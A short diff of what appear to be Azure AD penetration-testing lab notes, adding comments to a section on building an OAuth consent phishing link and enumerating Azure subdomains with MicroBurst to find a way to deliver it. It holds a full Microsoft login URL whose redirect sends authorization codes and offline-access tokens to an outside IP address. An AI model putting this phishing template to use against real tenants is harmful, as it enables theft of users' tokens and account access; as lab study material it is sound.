@@ -234,13 +234,14 @@ Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Forc
 ```
 
 #### Tricky way to get phishing redirect url template
-
+- OK users can consent, lets prepare a phishing link:
 goto ```https://localhost/``` and click readmore - take url from address bar which is a good redirect template:
 ```
 https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=c0e39a5f-266c-4425-b6cf-d55350b868dc&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.152.213%2Flogin%2Fauthorized&response_mode=query&sso_reload=true
 ```
 
-#### find vulnerable website
+#### find vulnerable way to send the phish
+- We can use Microburst to look for subdomains, if we find something usable like a form upload we can exploit the fact that noone cares about group email OPSEC:
 ```
 . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
 Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
